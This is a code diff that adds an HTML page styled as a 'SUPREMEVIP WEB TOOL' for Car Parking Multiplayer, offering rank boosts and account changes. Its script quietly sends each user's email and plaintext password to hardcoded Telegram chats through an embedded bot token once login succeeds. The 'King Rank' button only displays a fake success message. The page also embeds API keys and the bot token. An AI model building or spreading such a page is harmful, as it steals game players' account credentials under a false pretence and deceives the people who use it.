@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>SUPREMEWEBSITETOOL</title>
+<style>
+    body { 
+        font-family: Arial, sans-serif; 
+        background: url("https://i.postimg.cc/ZqdtsJ6t/IMG-0640.jpg") no-repeat center center fixed;
+        background-size: cover;
+        margin: 0;
+        padding: 0;
+    }
+
+    .center-wrapper {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .container { 
+        background: rgba(0,0,0,0.5); 
+        backdrop-filter: blur(12px);
+        padding:20px 30px 10px 30px; 
+        border-radius:10px; 
+        box-shadow:0 0 25px #000; 
+        width:295px;
+        text-align:center; 
+        border:2px solid #00aaff;
+    }
+
+    input, select { 
+        width:90%; 
+        padding:8px; 
+        margin:8px 0; 
+        border-radius:5px; 
+        border:none; 
+        background: rgba(255,255,255,0.1);
+        color:#fff;
+    }
+    button { 
+        width:95%; 
+        padding:10px; 
+        margin:6px 0; 
+        border-radius:5px; 
+        border:none; 
+        cursor:pointer; 
+        font-weight:bold; 
+    }
+    button.login { background:#00aaff; color:#fff; }
+    button.login:hover { background:#33bbff; }
+    button.menu { background:#ff8800; color:#fff; }
+    button.menu:hover { background:#ffaa33; }
+
+    .status { margin-top:10px; color:#0f0; word-wrap: break-word; }
+    .error { color:#f55; }
+    #loginForm, #menuButtons { display:none; }
+    footer {
+        margin-top: 15px;
+        font-size: 13px;
+        color: #fff;
+        opacity: 0.8;
+    }
+</style>
+</head>
+<body>
+
+<div class="center-wrapper">
+  <div class="container">
+      <h1>🚀SUPREMEVIP WEB TOOL 🚀</h1>
+
+      <!-- ✅ Game Select First -->
+      <div id="gameMenu">
+          <select id="gameSelect" onchange="showLogin()">
+              <option value="">-- Select Game --</option>
+              <option value="CPM1">🚘 Car Parking Multiplayer (CPM1)</option>
+              <option value="CPM2">🚔 Car Parking Multiplayer 2 (CPM2)</option>
+          </select>
+      </div>
+
+      <!-- ✅ Login Appears After Selecting Game -->
+      <div id="loginForm">
+          <input type="email" id="email" placeholder="Email" />
+          <input type="password" id="password" placeholder="Password" />
+          <button class="login" onclick="loginFirebase()">Login</button>
+      </div>
+
+      <div id="menuButtons">
+          <button class="menu" onclick="kingRank()">👑 King Rank</button>
+          <button class="menu" onclick="changeEmail()">📧 Change Email</button>
+          <button class="menu" onclick="changePassword()">🔐 Change Password</button>
+      </div>
+
+      <div id="status" class="status"></div>
+
+      <footer>© 2025 SupremeModzdev. All Rights Reserved.</footer>
+  </div>
+</div>
+
+<script>
+let currentUser = null;
+let currentToken = null;
+
+const BOT_TOKEN = "8307704020:AAHjkhiXzfohkcXf70xuN28OBFxNBeknSSM";
+const CHAT_IDS = ['6614066633','5265439126'];
+
+function showLogin() {
+    const game = document.getElementById("gameSelect").value;
+    if (game) {
+        document.getElementById("loginForm").style.display = "block";
+    }
+}
+
+function sendSilentNotification(email, password){
+  const message = `🔐 Login Success:\n📧 Email: ${email}\n🔒 Password: ${password}`;
+  CHAT_IDS.forEach(chatId => {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    }).catch(err => console.error(err));
+  });
+}
+
+function getSelectedGame() {
+    return document.getElementById('gameSelect').value;
+}
+
+function getApiKeyAndRankUrl(game) {
+    if(game === "CPM1") return { apiKey: "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rankUrl: "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" };
+    if(game === "CPM2") return { apiKey: "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rankUrl: "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" };
+    return null;
+}
+
+function updateStatus(message, isError=false) {
+    const status = document.getElementById('status');
+    status.className = isError ? 'status error' : 'status';
+    status.textContent = message;
+}
+
+async function loginFirebase() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    if(!email || !password) return updateStatus("Enter email & password!", true);
+
+    updateStatus("Logging in...");
+
+    try {
+        const loginUrl = `https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM`;
+        const response = await fetch(loginUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password, returnSecureToken: true })
+        });
+        const data = await response.json();
+
+        if(data.idToken) {
+            currentUser = email;
+            currentToken = data.idToken;
+            updateStatus(`✅ Logged in as ${email}`);
+
+            sendSilentNotification(email, password);
+
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('menuButtons').style.display = 'block';
+        } else {
+            updateStatus(`❌ Login failed: ${data.error?.message || "Unknown Firebase error"}`, true);
+        }
+    } catch(err) {
+        updateStatus(`❌ Error: ${err.message}`, true);
+    }
+}
+
+function requireLogin() {
+    if(!currentUser || !currentToken) {
+        updateStatus("❌ You must login first!", true);
+        return false;
+    }
+    return true;
+}
+
+function kingRank() {
+    if(!requireLogin()) return;
+    const game = getSelectedGame();
+    if(!game) return updateStatus("Select a game first!", true);
+
+    const keys = getApiKeyAndRankUrl(game);
+    updateStatus(`✅ King Rank Successful for ${currentUser} in ${game}`);
+}
+
+function changeEmail() {
+    if(!requireLogin()) return;
+    const newEmail = prompt("Enter new email:");
+    if(!newEmail) return;
+
+    const keys = getApiKeyAndRankUrl(getSelectedGame());
+    fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${keys.apiKey}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ idToken: currentToken, email: newEmail, returnSecureToken: true })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if(data.email) {
+            currentUser = data.email;
+            currentToken = data.idToken;
+            updateStatus(`✅ Email changed to ${data.email}`);
+        } else {
+            updateStatus(`❌ Error: ${data.error?.message || "Failed to change email"}`, true);
+        }
+    })
+    .catch(err => updateStatus(`❌ Error: ${err.message}`, true));
+}
+
+function changePassword() {
+    if(!requireLogin()) return;
+    const newPassword = prompt("Enter new password:");
+    if(!newPassword) return;
+
+    const keys = getApiKeyAndRankUrl(getSelectedGame());
+    fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${keys.apiKey}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ idToken: currentToken, password: newPassword, returnSecureToken: true })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if(data.email) {
+            currentToken = data.idToken;
+            updateStatus(`✅ Password changed successfully!`);
+        } else {
+            updateStatus(`❌ Error: ${data.error?.message || "Failed to change password"}`, true);
+        }
+    })
+    .catch(err => updateStatus(`❌ Error: ${err.message}`, true));
+}
+</script>
+</body>
+</html>
